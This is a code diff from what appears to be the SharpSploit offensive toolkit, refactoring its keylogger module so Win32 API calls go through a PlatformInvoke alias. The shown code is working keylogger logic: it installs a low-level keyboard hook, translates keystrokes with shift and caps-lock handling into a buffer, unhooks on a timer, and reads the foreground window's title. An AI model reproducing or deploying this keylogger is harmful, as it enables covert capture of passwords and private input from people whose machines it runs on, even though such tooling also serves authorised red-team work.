@@ -11,6 +11,7 @@ using Forms = System.Windows.Forms;
 using System.Runtime.InteropServices;
 
 using SharpSploit.Execution;
+using PInvoke = SharpSploit.Execution.PlatformInvoke;
 
 namespace SharpSploit.Enumeration
 {
@@ -45,11 +46,11 @@ namespace SharpSploit.Enumeration
                 {
                     int vkCode = Marshal.ReadInt32(lParam);
                     
-                    bool shifted = Win32.User32.GetKeyState(160) < 0 || Win32.User32.GetKeyState(161) < 0;
+                    bool shifted = PInvoke.Win32.User32.GetKeyState(160) < 0 || PInvoke.Win32.User32.GetKeyState(161) < 0;
                     Keys keycode = (Keys)vkCode;
                     if (!(shifted && KeyDictShift.TryGetValue(keycode, out string append)) &&  !KeyDict.TryGetValue(keycode, out append))
                     {
-                        bool capped = Win32.User32.GetKeyState(20) != 0;
+                        bool capped = PInvoke.Win32.User32.GetKeyState(20) != 0;
                         if ((capped && shifted) || !(capped || shifted))
                         {
                             append = keycode.ToString().ToLower();
@@ -61,15 +62,15 @@ namespace SharpSploit.Enumeration
                     }
                     Builder.Append(append);
                 }
-                return Win32.User32.CallNextHookEx(HookID, nCode, wParam, lParam);
+                return PInvoke.Win32.User32.CallNextHookEx(HookID, nCode, wParam, lParam);
             };
-            HookID = Win32.User32.SetWindowsHookEx(Win32.User32.WH_KEYBOARD_LL, hookproc, Win32.Kernel32.GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName), 0);
+            HookID = PInvoke.Win32.User32.SetWindowsHookEx(Win32.User32.WH_KEYBOARD_LL, hookproc, PInvoke.Win32.Kernel32.GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName), 0);
             using (Timer timer = new Timer(Seconds * 1000))
             {
                 timer.Elapsed += (source, e) =>
                 {
                     Builder.AppendLine(String.Format("\r\n\r\nFinished Keylogger at {0:HH:mm:ss.fff}", DateTime.Now));
-                    Win32.User32.UnhookWindowsHookEx(HookID);
+                    PInvoke.Win32.User32.UnhookWindowsHookEx(HookID);
                     timer.Stop();
                     Forms.Application.Exit();
                 };
@@ -88,9 +89,9 @@ namespace SharpSploit.Enumeration
         {
             const int capacity = 256;
             StringBuilder builder = new StringBuilder(capacity);
-            IntPtr handle = Win32.User32.GetForegroundWindow();
+            IntPtr handle = PInvoke.Win32.User32.GetForegroundWindow();
 
-            if (Win32.User32.GetWindowText(handle, builder, capacity) > 0)
+            if (PInvoke.Win32.User32.GetWindowText(handle, builder, capacity) > 0)
             {
                 return builder.ToString();
             }
